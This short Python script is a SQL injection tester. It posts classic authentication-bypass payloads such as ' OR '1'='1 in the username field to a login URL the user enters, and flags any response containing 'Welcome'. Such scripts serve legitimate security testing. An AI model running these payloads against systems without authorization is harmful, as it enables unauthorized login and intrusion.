# sql_injection_tester.py
import requests

def test_sql_injection(url, payloads):
    for payload in payloads:
        data = {
            'username': payload,
            'password': 'password123'
        }
        response = requests.post(url, data=data)
        if "Welcome" in response.text:
            print(f"Possible SQL Injection vulnerability with payload: {payload}")

if __name__ == "__main__":
    target_url = input("Enter the login URL: ")
    payloads = [
        "' OR '1'='1",
        "' OR '1'='1' -- ",
        "' OR '1'='1' ({",
        "' OR '1'='1' /*",
    ]
    test_sql_injection(target_url, payloads)
